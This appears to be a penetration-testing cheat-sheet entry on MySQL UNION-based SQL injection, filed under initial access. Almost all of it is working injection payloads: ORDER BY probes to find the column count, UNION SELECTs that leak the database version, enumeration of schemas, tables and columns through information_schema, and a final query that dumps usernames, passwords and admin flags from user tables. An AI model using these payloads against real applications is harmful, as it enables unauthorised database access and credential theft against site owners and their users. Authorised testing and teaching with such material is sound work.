---
title: MySQL UNION-based SQL Injection
category: initial-access
subcategory: sqli
os: linux
command: "' UNION SELECT 1,2,3 #"
tools: manual injection
---


### Determine number of columns

```sql
' order by 1 #
' order by 2 #
' order by 3 #
' order by 4 #
```

Increase until error appears - that tells you the column count.

### Union with MySQL version

```sql
' union select 1,2,3 #
' union select version(),2,3 #
```

### Enumerate schemas/tables/columns

```sql
' union select 1,2,3 from information_schema.columns #
' union select TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME from information_schema.columns #
```

### Filter out default schemas

```sql
' union select TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME from information_schema.columns WHERE TABLE_SCHEMA != "information_schema" and TABLE_SCHEMA != "performance_schema" and TABLE_SCHEMA != "mysql" #
```

### Dump credentials from multiple tables

```sql
' union select username,password,IsAdmin from webdb.cms_users union select username,password,3 from webdb.users #
```
